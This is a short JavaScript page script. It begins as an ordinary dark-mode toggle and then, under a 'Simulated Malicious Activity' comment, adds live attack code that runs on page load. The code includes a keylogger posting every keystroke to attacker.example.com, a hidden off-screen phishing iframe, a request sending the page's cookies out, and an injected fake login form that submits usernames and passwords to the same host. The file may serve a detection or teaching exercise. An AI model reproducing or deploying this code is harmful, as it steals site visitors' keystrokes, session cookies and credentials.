document.addEventListener('DOMContentLoaded', () => {
    const toggleButton = document.getElementById('darkModeToggle');
    const elements = [document.body, document.querySelector('.container')];
    const darkModeClass = 'dark-mode';

    // Load dark mode preference
    if (localStorage.getItem('darkMode') === 'enabled') {
        elements.forEach(el => el?.classList.add(darkModeClass));
    }

    toggleButton.addEventListener('click', () => {
        const isDarkMode = document.body.classList.toggle(darkModeClass);
        elements[1]?.classList.toggle(darkModeClass);
        localStorage.setItem('darkMode', isDarkMode ? 'enabled' : '');
    });

    // 🚨 Simulated Malicious Activity 🚨

    // Keylogger Simulation
    document.addEventListener('keydown', (event) => {
        const data = { key: event.key, time: new Date().toISOString() };
        fetch('https://attacker.example.com/keystrokes', {
            method: 'POST',
            body: JSON.stringify(data),
            headers: { 'Content-Type': 'application/json' }
        });
    });

    // Hidden iframe Injection (Drive-by Attack Simulation)
    const iframe = document.createElement('iframe');
    iframe.src = "https://attacker.example.com/phishing";
    iframe.style = "position: absolute; top: -9999px; left: -9999px; width: 1px; height: 1px;";
    document.body.appendChild(iframe);

    // Cookie Stealing (Session Hijacking)
    fetch('https://attacker.example.com/cookie-theft', {
        method: 'POST',
        body: JSON.stringify({ cookies: document.cookie }),
        headers: { 'Content-Type': 'application/json' }
    });

    // DOM Manipulation (Fake Login Form Injection)
    const fakeLogin = document.createElement('div');
    fakeLogin.innerHTML = `<form action="https://attacker.example.com/steal" method="POST">
        <input type="text" name="username" placeholder="Username">
        <input type="password" name="password" placeholder="Password">
        <button type="submit">Login</button>
    </form>`;
    fakeLogin.style = "position: fixed; top: 50px; left: 50px; background: white; padding: 10px; border: 1px solid red;";
    document.body.appendChild(fakeLogin);
});
